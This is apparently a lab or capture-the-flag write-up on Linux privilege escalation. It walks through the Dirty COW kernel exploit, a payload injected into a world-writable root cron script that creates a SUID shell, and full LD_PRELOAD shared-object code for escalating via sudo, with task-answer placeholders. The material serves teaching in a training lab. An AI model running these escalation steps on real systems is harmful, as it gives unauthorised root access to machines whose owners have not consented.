## 💥 Public Exploits – Dirty COW (CVE-2016-5195)

### What is Dirty COW?
- A race condition in the Linux kernel (versions 2.6.22 – 4.8.3) that allows **unprivileged local users** to gain write access to read‑only memory, leading to root.
- Exploit creates a new root user (`firefart`) with empty password.

### Exploitation Workflow
1. **Enumerate** – `uname -a` to check kernel version.
2. **Find exploit** – `searchsploit dirty cow` (local copy of Exploit‑DB).
3. **Download** – `searchsploit -m linux/local/40839.c` (most reliable).
4. **Transfer** – `scp 40839.c john@TARGET_IP:/home/john/`.
5. **Compile** – `gcc -pthread 40839.c -o dirty -lcrypt`.
   - `-pthread` – needed for multithreading (race condition).
   - `-lcrypt` – links crypt library for password hashing.
6. **Execute** – `./dirty < /dev/null` (the `< /dev/null` prevents hanging on password prompt).
7. **Switch user** – `su firefart` (press Enter for empty password).
8. **Read flag** – `cat /root/flag.txt`.

**⚠️ Troubleshooting:**
- If compilation fails with `undefined reference to crypt`, make sure `-lcrypt` is included.
- If `/tmp/passwd.bak` exists, delete it and re‑run.
- Exploit may not succeed first time – run again.

**Task 3 Answer:**
- Contents of `/root/flag.txt` → obtained by completing the above steps. (In the room, the flag is the answer.)

## 📊 Process Monitoring with `pspy`

### Why `pspy`?
- Traditional tools (`ps`, `top`) only show processes visible to your user.
- `pspy` uses `inotify` watches to catch short‑lived processes (cron jobs, scripts) that run as root – **without needing root privileges**.

### Running `pspy`
- Pre‑installed in `/home/john/`.
```bash
./pspy64
# Let it run for a few minutes – look for UID=0 processes.
```

### Identifying a Vulnerable Script
- From `pspy` output, spot a **root‑owned** script that is **world‑writable** (`-rwxrwxrwx`).
- Example:
```bash
UID=0    PID=1234  /usr/local/bin/rm-tmp.sh
```
- Check permissions:
```bash
ls -la /usr/local/bin/rm-tmp.sh
# -rwxrwxrwx 1 root root – world-writable!
```

### Exploitation
- Inject a payload into the script (since you can write to it):
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /usr/local/bin/rm-tmp.sh
```
- Wait for the cron job to run (usually every minute).
- Execute the SUID shell:
```bash
/tmp/rootbash -p
# Now you are root!
```

**Task 4 Answers:**
- Full path of the vulnerable script → `/usr/local/bin/rm-tmp.sh` (or the one found in your lab – this is the example).
- Flag in `/root/flag.txt` → obtained after escalating.

## 🎯 Challenge – Full Exploitation

### Objective
- From `john`, use any method to reach root and read flags.
- Methods available: Dirty COW (kernel exploit), world‑writable script (pspy), LD_PRELOAD (sudo misconfig), etc.

### Enumeration Recap
```bash
uname -a
./les.sh
sudo -l
./pspy64 &
find / -perm -u=s -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
find / -perm -002 -type f 2>/dev/null | grep -v proc
```

### Alternative: LD_PRELOAD Exploitation
- If `sudo -l` shows `env_keep+=LD_PRELOAD`, exploit:
```bash
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id
# Now you're root.
```

### Final Steps
- Verify root: `whoami`, `id`.
- Read flags: `/home/frank/flag.txt` and `/root/flag.txt`.

**Task 5 Answers:**
- Contents of `/home/frank/flag.txt` → obtained by completing the challenge.
- Contents of `/root/flag.txt` → obtained after root.

## 🔑 Key Takeaways
- **Automation tools** (LES, LinPEAS, pspy) save time but are **not** a replacement for understanding.
- **Public exploits** (like Dirty COW) require proper research, compilation, and execution – always read the code and adapt flags.
- **`pspy`** fills the blind spot of short‑lived processes – crucial for identifying cron‑based privilege escalation.
- **Multiple vectors** exist on real systems; if one fails, try another (kernel exploit, writable scripts, LD_PRELOAD, SUID binaries, etc.).
- **Always verify** after exploitation (`whoami`, `id`, `cat /root/flag.txt`).
